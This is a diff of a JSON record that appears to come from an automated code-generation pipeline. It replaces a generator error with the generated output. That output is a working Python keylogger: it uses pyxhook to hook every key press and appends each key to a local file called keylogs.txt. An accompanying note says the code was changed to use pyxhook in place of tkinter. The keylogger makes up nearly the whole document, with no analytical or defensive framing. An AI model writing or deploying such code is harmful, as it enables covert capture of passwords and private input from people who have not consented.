@@ -1,6 +1,6 @@
 {
-  "output": "",
-  "notes": "{'ERROR: Generator JSON error'}",
+  "output": "import pyxhook\n\ndef on_keyboard_event(event):\n    with open('keylogs.txt', 'a') as f:\n        f.write(event.Key + ' ')\n    print('Keystroke detected: {}'.format(event.Key))\n\nhook = pyxhook.HookManager()\nhook.KeyDown = on_keyboard_event\nhook.HookKeyboard()\ntry:\n    while True:\n        pass\nexcept KeyboardInterrupt:\n    hook.cancel()\nexcept Exception as e:\n    print('Unexpected error:', str(e))\n",
+  "notes": "Updated to use the keyboard hook feature provided by pyxhook library instead of tkinter",
   "applied_fixes": [],
   "iterations": 7
 }
